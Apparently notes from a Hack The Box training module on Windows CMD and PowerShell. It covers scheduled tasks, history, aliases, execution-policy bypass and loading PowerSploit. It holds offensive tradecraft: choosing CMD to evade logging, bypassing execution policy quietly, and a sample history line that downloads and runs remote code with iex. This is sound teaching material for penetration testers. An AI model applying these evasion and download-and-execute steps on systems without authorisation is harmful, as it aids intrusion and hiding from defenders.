Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

* Delete the Scheduled Task(s): Delete Syntax

| Action | Parameter | Description
| ------ | --------- | -----------
| Delete | | Remove a task from the schedule
| | /tn | Identifies the task to delete.
| | /s | Specifies the name or IP address to delete the task from.
| | /u | Specifies the user to run the task as.
| | /p | Specifies the password to run the task as.
| | /f | Stops the confirmation warning.

```
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.


## PowerShell

Feature | CMD | PowerShell
------- | --- | ----------
Language | Batch and basic CMD commands only. | PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.
Command utilization | The output from one command cannot be passed into another directly as a structured object, due to the limitation of handling the text output. | The output from one command can be passed into another directly as a structured object resulting in more sophisticated commands.
Command Output | Text only. | PowerShell outputs in object formatting.
Parallel Execution | CMD must finish one command before running another. | PowerShell can multi-thread commands to run in parallel.

From a stealth perspective, PowerShell's logging and history capability is powerful and will log more of our interactions with the host. So if we do not need PowerShell's capabilities and wish to be more stealthy, we should utilize CMD.

* Using Get-Help

```
PS C:\Users\htb-student> Get-Help Test-Wsman
```

* Using Update-Help to have most up-to-date information
```
PS C:\Windows\system32> Update-Help
```

* `pwd` of PowerShell
```
PS C:\Users\DLarusso> Get-Location

Path
----
C:\Users\DLarusso
```

* Listing the Directory

```
PS C:\htb> Get-ChildItem 

Directory: C:\Users\DLarusso


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/26/2021  10:26 PM                .ssh
d-----         1/28/2021   7:05 PM                .vscode
d-r---         1/27/2021   2:44 PM                3D Objects
d-r---         1/27/2021   2:44 PM                Contacts
d-r---         9/18/2022  12:35 PM                Desktop
d-r---         9/18/2022   1:01 PM                Documents
d-r---         9/26/2022  12:27 PM                Downloads
d-r---         1/27/2021   2:44 PM                Favorites
d-r---         1/27/2021   2:44 PM                Music
dar--l         9/26/2022  12:03 PM                OneDrive
d-r---         5/22/2022   2:00 PM                Pictures
```

* Move to a new directory

```
PS C:\htb>  Set-Location .\Documents\

PS C:\Users\tru7h\Documents> Get-Location

Path
----
C:\Users\DLarusso\Documents
```

* Display contents of a file

```
PS C:\htb> Get-Content Readme.md  

# ![logo][] PowerShell

Welcome to the PowerShell GitHub Community!
PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 

<SNIP> 
```

* Get-Command

Get-Command is a great way to find a pesky command that might be slipping from our memory right when we need to use it. With PowerShell using the verb-noun convention for cmdlets, we can search on either.
```
PS C:\htb> Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Add-AppPackage                                     2.0.1.0    Appx
Alias           Add-AppPackageVolume                               2.0.1.0    Appx
Alias           Add-AppProvisionedPackage                          3.0        Dism
Alias           Add-ProvisionedAppPackage                          3.0        Dism
Alias           Add-ProvisionedAppxPackage                         3.0        Dism
Alias           Add-ProvisioningPackage                            3.0        Provisioning
Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
Alias           Apply-WindowsUnattend                              3.0        Dism
Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
Alias           Flush-Volume                                       2.0.0.0    Storage
Alias           Get-AppPackage                                     2.0.1.0    Appx

<SNIP>  
```

```
PS C:\htb> Get-Command -verb get

<SNIP>
Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
<SNIP>  
```

Using the `-verb` modifier and looking for any cmdlet, alias, or function with the term get in the name, we are provided with a detailed list of everything PowerShell is currently aware of. We can also perform the exact search using the filter `get*` instead of the `-verb` `get`. The Get-Command cmdlet recognizes the `*` as a wildcard and shows each variant of `get`(anything). We can do something similar by searching on the noun as well.

```
PS C:\htb> Get-Command -noun windows*  

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Apply-WindowsUnattend                              3.0        Dism
Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
Cmdlet          Add-WindowsCapability                              3.0        Dism
Cmdlet          Add-WindowsDriver                                  3.0        Dism
Cmdlet          Add-WindowsImage                                   3.0        Dism
Cmdlet          Add-WindowsPackage                                 3.0        Dism
Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
Cmdlet          Dismount-WindowsImage                              3.0        Dism
Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
```

* Get-History

```
PS C:\htb> Get-History

 Id CommandLine
  -- -----------
   1 Get-Command
   2 clear
   3 get-command -verb set
   4 get-command set*
   5 clear
   6 get-command -verb get
   7 get-command -noun windows
   8 get-command -noun windows*
   9 get-module
  10 clear
  11 get-history
  12 clear
  13 ipconfig /all
  14 arp -a
  15 get-help
  16 get-help get-module
```

By default, `Get-History` will only show the commands that have been run during this active session. Notice how the commands are numbered; we can recall those commands by using the alias `r` followed by the number to run that command again. For example, if we wanted to rerun the `arp -a` command, we could issue `r 14`, and PowerShell will action it. Keep in mind that if we close the shell window, or in the instance of a remote shell through command and control, once we kill that session or process that we are running, our PowerShell history will disappear. With `PSReadLine`, however, that is not the case. `PSReadLine` stores everything in a file called `$($host.Name)_history.txt` located at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine`.


* Viewing PSReadLine History
```
PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

get-module
Get-ChildItem Env: | ft Key,Value
Get-ExecutionPolicy
clear
ssh administrator@10.172.16.110.55
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
Get-ExecutionPolicy

<SNIP>
```

One feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:

*   `password`
*   `asplaintext`
*   `token`
*   `apikey`
*   `secret`

The built-in session history does not do this.

* Hotkeys

HotKey | Description
------ | -----------
CTRL+R | It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.
CTRL+L | Quick screen clear.
CTRL+ALT+Shift+? | This will print the entire list of keyboard shortcuts PowerShell will recognize.
Escape | When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line.
↑ | Scroll up through our previous history.
↓ | Scroll down through our previous history.
F7 | Brings up a TUI with a scrollable interactive history from our session.

* Aliases

Our last tip to mention is `Aliases`. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the [Get-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2) cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.
```
PS C:\Windows\system32> Get-Alias

CommandType     Name
-----------     ----
Alias           % -> ForEach-Object
Alias           ? -> Where-Object
Alias           ac -> Add-Content
Alias           asnp -> Add-PSSnapin
Alias           cat -> Get-Content
Alias           cd -> Set-Location
Alias           CFS -> ConvertFrom-String
Alias           chdir -> Set-Location
Alias           clc -> Clear-Content
Alias           clear -> Clear-Host
Alias           clhy -> Clear-History
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           cls -> Clear-Host
Alias           clv -> Clear-Variable
Alias           cnsn -> Connect-PSSession
Alias           compare -> Compare-Object
Alias           copy -> Copy-Item
Alias           cp -> Copy-Item
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           curl -> Invoke-WebRequest
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoint
Alias           del -> Remove-Item
Alias           diff -> Compare-Object
Alias           dir -> Get-ChildItem

<SNIP>
```

* Using Set-Alias
```
PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
```

* Helpful Aliases

Alias | Description
----- | -----------
pwd | gl can also be used. This alias can be used in place of Get-Location.
ls | dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.
cd | sl and chdir can be used in place of cd. This is an alias for Set-Location.
cat | type and gc can also be used. This is an alias for Get-Content.
clear | Can be used in place of Clear-Host.
curl | Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.
fl and ft | These aliases can be used to format output into list and table outputs.
man | Can be used in place of help.


All About Cmdlets and Modules
=============================

* * *

In this section, we will cover the following:

*   What are cmdlets and Modules?
*   How do we interact with them?
*   How do we install and load new modules from the web?

Understanding these questions is crucial when utilizing PowerShell as both a sysadmin and pentester. PowerShells' ability to be modular and expandable makes it a powerhouse tool to have in our kit. Let us dive into what cmdlets and modules are.

* * *

Cmdlets
-------

A [cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-13?view=powershell-7.2) as defined by Microsoft is:

"`a single-feature command that manipulates objects in PowerShell.`"

Cmdlets follow a Verb-Noun structure which often makes it easier for us to understand what any given cmdlet does. With Test-WSMan, we can see the `verb` is `Test` and the `Noun` is `Wsman`. The verb and noun are separated by a dash (`-`). After the verb and noun, we would use the options available to us with a given cmdlet to perform the desired action. Cmdlets are similar to functions used in PowerShell code or other programming languages but have one significant difference. Cmdlets are `not` written in PowerShell. They are written in C# or another language and then compiled for use. As we saw in the last section, we can use the `Get-Command` cmdlet to view the available applications, cmdlets, and functions, along with a trait labeled "CommandType" that can help us identify its type.

If we want to see the options and functionality available to us with a specific cmdlet, we can use the [Get-Help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.2) cmdlet as well as the `Get-Member` cmdlet.

* * *

PowerShell Modules
------------------

A [PowerShell module](https://docs.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.2) is structured PowerShell code that is made easy to use & share. As mentioned in the official Microsoft docs, a module can be made up of the following:

*   Cmdlets
*   Script files
*   Functions
*   Assemblies
*   Related resources (manifests and help files)

Through this section, we are going to use the PowerView project to examine what makes up a module and how to interact with them. `PowerView.ps1` is part of a collection of PowerShell modules organized in a project called [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) created by the [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments. Though we may notice this project has been archived, many of the included tools are still relevant and useful in pen-testing today (written in August 2022). We will not extensively cover the usage and implementation of PowerSploit in this module. We will just be using it as a reference to understand PowerShell better. The use of PowerSploit to Enumerate & Attack Windows Domain environments is covered in great depth in the module [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

![GitHub repository page for PowerSploit, showing file list with descriptions, commit history, and project details. Highlighted files: PowerSploit.psd1 and PowerSploit.psm1, related to Invoke-PrivescAudit. Note: Project is no longer supported.](https://academy.hackthebox.com/storage/modules/167/ImportModulePowerSploit.png)

### PowerSploit.psd1

A PowerShell data file (`.psd1`) is a [Module manifest file](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.2). Contained in a manifest file we can often find:

*   Reference to the module that will be processed
*   Version numbers to keep track of major changes
*   The GUID
*   The Author of the module
*   Copyright
*   PowerShell compatibility information
*   Modules & cmdlets included
*   Metadata

#### PowerSploit.psd1

![GIF showcasing the PowerSploit.psd1 file in the Github repository.](https://academy.hackthebox.com/storage/modules/167/PowerSploitpsd1.gif)

### PowerSploit.psm1

A PowerShell script module file (`.psm1`) is simply a script containing PowerShell code. Think of this as the meat of a module.

#### Contents of PowerSploit.psm1

All About Cmdlets and Modules

    Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
    

The Get-ChildItem cmdlet gets the items in the current directory (represented by the $PSScriptRoot automatic variable), and the Where-Object cmdlet (aliased as the "?" character) filters those down to only the items that are folders and do not have the names "Tests" or "docs". Finally, the ForEach-Object cmdlet (aliased as the "%" character) executes the Import-Module cmdlet against each of those remaining items, passing the DisableNameChecking parameter to prevent errors if the module contains cmdlets or functions with the same names as cmdlets or functions in the current session.

* * *

Using PowerShell Modules
------------------------

Once we decide what PowerShell module we want to use, we will have to determine how and from where we will run it. We also must consider if the chosen module and scripts are already on the host or if we need to get them on to the host. `Get-Module` can help us determine what modules are already loaded.

#### Get-Module

All About Cmdlets and Modules

    PS C:\htb> Get-Module 
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
    Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
    Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
    Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expan...
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
    

#### List-Available

All About Cmdlets and Modules

    PS C:\htb> Get-Module -ListAvailable 
    
     Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules
    
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...
    
    
        Directory: C:\Program Files\WindowsPowerShell\Modules
    
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
    Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
    Script     3.4.0      Pester                              {Describe, Context, It, Should...}
    Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
    

The `-ListAvailable` modifier will show us all modules we have installed but not loaded into our session.

We have already transferred the desired module or scripts onto a target Windows host. We will then need to run them. We can start them through the use of the `Import-Module` cmdlet.

#### Using Import-Module

The [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) cmdlet allows us to add a module to the current PowerShell session.

All About Cmdlets and Modules

    PS C:\Users\htb-student> Get-Help Import-Module
    
    NAME
        Import-Module
    
    SYNOPSIS
        Adds modules to the current session.
    
    
    SYNTAX
        Import-Module [-Assembly] <System.Reflection.Assembly[]> [-Alias <System.String[]>] [-ArgumentList
        <System.Object[]>] [-AsCustomObject] [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force] [-Function
        <System.String[]>] [-Global] [-NoClobber] [-PassThru] [-Prefix <System.String>] [-Scope {Local | Global}]
        [-Variable <System.String[]>] [<CommonParameters>]
    
        Import-Module [-Name] <System.String[]> [-Alias <System.String[]>] [-ArgumentList <System.Object[]>]
        [-AsCustomObject] [-CimNamespace <System.String>] [-CimResourceUri <System.Uri>] -CimSession
        <Microsoft.Management.Infrastructure.CimSession> [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force]
        [-Function <System.String[]>] [-Global] [-MaximumVersion <System.String>] [-MinimumVersion <System.Version>]
        [-NoClobber] [-PassThru] [-Prefix <System.String>] [-RequiredVersion <System.Version>] [-Scope {Local | Global}]
        [-Variable <System.String[]>] [<CommonParameters>]
    
    <SNIP>
    

To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (`Get-NetLocalgroup`) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host's Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup. See this in action in the clip below:

#### Importing PowerSploit.psd1

All About Cmdlets and Modules

    PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
    PS C:\Users\htb-student\Desktop\PowerSploit> Get-NetLocalgroup
    
    ComputerName GroupName                           Comment
    ------------ ---------                           -------
    WS01         Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
    WS01         Administrators                      Administrators have complete and unrestricted access to the compute...
    WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
    WS01         Cryptographic Operators             Members are authorized to perform cryptographic operations.
    WS01         Distributed COM Users               Members are allowed to launch, activate and use Distributed COM obj...
    WS01         Event Log Readers                   Members of this group can read event logs from local machine
    WS01         Guests                              Guests have the same access as members of the Users group by defaul...
    WS01         Hyper-V Administrators              Members of this group have complete and unrestricted access to all ...
    WS01         IIS_IUSRS                           Built-in group used by Internet Information Services.
    WS01         Network Configuration Operators     Members in this group can have some administrative privileges to ma...
    WS01         Performance Log Users               Members of this group may schedule logging of performance counters,...
    WS01         Performance Monitor Users           Members of this group can access performance counter data locally a...
    WS01         Power Users                         Power Users are included for backwards compatibility and possess li...
    WS01         Remote Desktop Users                Members in this group are granted the right to logon remotely
    WS01         Remote Management Users             Members of this group can access WMI resources over management prot...
    WS01         Replicator                          Supports file replication in a domain
    WS01         System Managed Accounts Group       Members of this group are managed by the system.
    WS01         Users                               Users are prevented from making accidental or intentional system-wi...
    

![GIF showcasing the Import-Module command in a PowerShell window and importing the PowerSploit.psd1 module.](https://academy.hackthebox.com/storage/modules/167/Import-Module.gif)

Notice how at the beginning of the clip, `Get-NetLocalgroup` was not recognized. This event happened because it is not included in the default module path. We see where the default module path is by listing the environment variable `PSModulePath`.

#### Viewing PSModulePath

All About Cmdlets and Modules

    PS C:\Users\htb-student> $env:PSModulePath
    
    C:\Users\htb-student\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    

When the PowerSploit.psd1 module is imported, the `Get-NetLocalgroup` function is recognized. This happens because several modules are included when we load PowerSploit.psd1. It is possible to permanently add a module or several modules by adding the files to the referenced directories in the PSModulePath. This action makes sense if we were using a Windows OS as our primary attack host, but on an engagement, our time would be better off just transferring specific scripts over to the attack host and importing them as needed.

* * *

Execution Policy
----------------

An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). As outlined in Microsoft's official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.

#### Execution Policy's Impact

All About Cmdlets and Modules

    PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
    
    Import-Module : File C:\Users\Users\htb-student\PowerSploit.psm1
    cannot be loaded because running scripts is disabled on this system. For more information, see
    about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
    At line:1 char:1
    + Import-Module .\PowerSploit.psd1
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
        + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
    

The host's execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.

#### Checking Execution Policy State

All About Cmdlets and Modules

    PS C:\htb> Get-ExecutionPolicy 
    
    Restricted  
    

Our current setting restricts what the user can do. If we want to change the setting, we can do so with the `Set-ExecutionPolicy` cmdlet.

#### Setting Execution Policy

All About Cmdlets and Modules

    PS C:\htb> Set-ExecutionPolicy undefined 
    

By setting the policy to undefined, we are telling PowerShell that we do not wish to limit our interactions. Now we should be able to import and run our script.

#### Testing It Out

All About Cmdlets and Modules

    PS C:\htb> Import-Module .\PowerSploit.psd1
    
    Import-Module .\PowerSploit.psd1
    PS C:\Users\htb> get-module
    
    ModuleType Version    Name                                ExportedCommands
    ---------- -------    ----                                ----------------
    Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Check...
    Manifest   3.0.0.0    Microsoft.PowerShell.Security       {ConvertFrom-SecureString, Conver...
    Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Vari...
    Script     3.0.0.0    PowerSploit                         {Add-Persistence, Add-ServiceDacl...
    Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PS...
    

Looking at our loaded modules, we can see that we successfully loaded PowerSploit. Now we can use the tools as needed.

**Note: As a sysadmin, these kinds of changes are common and should always be reverted once we are done with work. As a pentester, us making a change like this and not reverting it could indicate to a defender that the host has been compromised. Be sure to check that we clean up after our actions. Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using -scope.**

#### Change Execution Policy By Scope

All About Cmdlets and Modules

    PS C:\htb> Set-ExecutionPolicy -scope Process 
    PS C:\htb> Get-ExecutionPolicy -list
    
    Scope ExecutionPolicy
            ----- ---------------
    MachinePolicy       Undefined
       UserPolicy       Undefined
          Process          Bypass
      CurrentUser       Undefined
     LocalMachine          Bypass  
    

By changing it at the Process level, our change will revert once we close the PowerShell session. Keep the execution policy in mind when working with scripts and new modules. Of course, we want to look at the scripts we are trying to load first to ensure they are safe for use. As penetration testers, we may run into times when we need to be creative about how we bypass the Execution Policy on a host. This [blog post](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) has some creative ways that we have used on real-world engagements with great success.

### Calling Cmdlets and Functions From Within a Module

If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use `Get-Command -Module <modulename>` to enlighten us.

#### Using Get-Command

All About Cmdlets and Modules

    PS C:\htb> Get-Command -Module PowerSploit
    
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Alias           Invoke-ProcessHunter                               3.0.0.0    PowerSploit
    Alias           Invoke-ShareFinder                                 3.0.0.0    PowerSploit
    Alias           Invoke-ThreadedFunction                            3.0.0.0    PowerSploit
    Alias           Invoke-UserHunter                                  3.0.0.0    PowerSploit
    Alias           Request-SPNTicket                                  3.0.0.0    PowerSploit
    Alias           Set-ADObject                                       3.0.0.0    PowerSploit
    Function        Add-Persistence                                    3.0.0.0    PowerSploit
    Function        Add-ServiceDacl                                    3.0.0.0    PowerSploit
    Function        Find-AVSignature                                   3.0.0.0    PowerSploit
    Function        Find-InterestingFile                               3.0.0.0    PowerSploit
    Function        Find-LocalAdminAccess                              3.0.0.0    PowerSploit
    Function        Find-PathDLLHijack                                 3.0.0.0    PowerSploit
    Function        Find-ProcessDLLHijack                              3.0.0.0    PowerSploit
    Function        Get-ApplicationHost                                3.0.0.0    PowerSploit
    Function        Get-GPPPassword                                    3.0.0.0    PowerSploit
    

Now we can see what was loaded by PowerSploit. From this point, we can use the scripts and functions as needed. This is the easy part, pick the function and let it run.

### Deep Dive: Finding & Installing Modules from PowerShell Gallery & GitHub

In today's day and age, sharing information is extremely easy. That goes for solutions and new creations as well. When it comes to PowerShell modules, the [PowerShell Gallery](https://www.powershellgallery.com/) Is the best place for that. It is a repository that contains PowerShell scripts, modules, and more created by Microsoft and other users. They can range from anything as simple as dealing with user attributes to solving complex cloud storage issues.

#### PowerShell Gallery

![PowerShell Gallery homepage showing search bar, statistics on unique packages, total downloads, and total packages. Includes sections for learning about the gallery and top package downloads like NetworkingDsc and PSWindowsUpdate.](https://academy.hackthebox.com/storage/modules/167/powershellg.png)

Conveniently for us, There is already a module built into PowerShell meant to help us interact with the PowerShell Gallery called `PowerShellGet`. Let us take a look at it:

#### PowerShellGet

All About Cmdlets and Modules

    PS C:\htb> Get-Command -Module PowerShellGet 
    
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Function        Find-Command                                       1.0.0.1    PowerShellGet
    Function        Find-DscResource                                   1.0.0.1    PowerShellGet
    Function        Find-Module                                        1.0.0.1    PowerShellGet
    Function        Find-RoleCapability                                1.0.0.1    PowerShellGet
    Function        Find-Script                                        1.0.0.1    PowerShellGet
    Function        Get-InstalledModule                                1.0.0.1    PowerShellGet
    Function        Get-InstalledScript                                1.0.0.1    PowerShellGet
    Function        Get-PSRepository                                   1.0.0.1    PowerShellGet
    Function        Install-Module                                     1.0.0.1    PowerShellGet
    Function        Install-Script                                     1.0.0.1    PowerShellGet
    Function        New-ScriptFileInfo                                 1.0.0.1    PowerShellGet
    Function        Publish-Module                                     1.0.0.1    PowerShellGet
    Function        Publish-Script                                     1.0.0.1    PowerShellGet
    Function        Register-PSRepository                              1.0.0.1    PowerShellGet
    Function        Save-Module                                        1.0.0.1    PowerShellGet
    Function        Save-Script                                        1.0.0.1    PowerShellGet
    Function        Set-PSRepository                                   1.0.0.1    PowerShellGet
    Function        Test-ScriptFileInfo                                1.0.0.1    PowerShellGet
    Function        Uninstall-Module                                   1.0.0.1    PowerShellGet
    Function        Uninstall-Script                                   1.0.0.1    PowerShellGet
    Function        Unregister-PSRepository                            1.0.0.1    PowerShellGet
    Function        Update-Module                                      1.0.0.1    PowerShellGet
    Function        Update-ModuleManifest                              1.0.0.1    PowerShellGet
    Function        Update-Script                                      1.0.0.1    PowerShellGet
    Function        Update-ScriptFileInfo                              1.0.0.1    PowerShellGet
    

This module has many different functions to help us work with and download existing modules from the gallery and make and upload our own. From our function listing, let us give Find-Module a try. One module that will prove extremely useful to system admins is the [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8) module. It is a collection of several other modules with tools meant for Active Directory management, Microsoft Exchange, virtualization, and many other tasks an admin would need on any given day.

#### Find-Module

All About Cmdlets and Modules

    PS C:\htb> Find-Module -Name AdminToolbox 
    
    Version    Name                                Repository           Description
    -------    ----                                ----------           -----------
    11.0.8     AdminToolbox                        PSGallery            Master module for a col...
    

Like with many other PowerShell cmdlets, we can also search using wildcards. Once we have found a module we wish to utilize, installing it is as easy as `Install-Module`. Remember that it requires administrative rights to install modules in this manner.

#### Install-Module

![GIF showcasing the Install-Module command piped to the Find-Module command in a PowerShell window.](https://academy.hackthebox.com/storage/modules/167/admintoolbox.gif)

In the image above, we chained `Find-Module` with `Install-Module` to simultaneously perform both actions. This example takes advantage of PowerShell's Pipeline functionality. We will cover this deeper in another section, but for now, it allowed us to find and install the module with one command string. Remember that modern instances of PowerShell will auto-import a module installed the first time we run a cmdlet or function from it, so there is no need to import the module after installing it. This differs from custom modules or modules we bring onto the host (from GitHub, for example). We will have to manually import it each time we want to use it unless we modify our PowerShell Profile. We can find the locations for each specific PowerShell profile [Here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2). Besides creating our own modules and scripts or importing them from the PowerShell Gallery, we can also take advantage of [Github](https://github.com/) and all the amazing content the IT community has come up with externally. Utilizing `Git` and `Github` for now requires the installation of other applications and knowledge of other concepts we have yet to cover, so we will save this for later in the module.

### Tools To Be Aware Of

Below we will quickly list a few PowerShell modules and projects we, as penetration testers and sysadmins, should be aware of. Each of these tools brings a new capability to use within PowerShell. Of course, there are plenty more than just our list; these are just several we find ourselves returning to on every engagement.

*   [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8): AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.
    
*   [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps): This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.
    
*   [Empire / Situational Awareness](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness): Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by [BC Security](https://github.com/BC-SECURITY) as a part of their Empire Framework.
    
*   [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.
    
*   [BloodHound / SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.
    

* * *
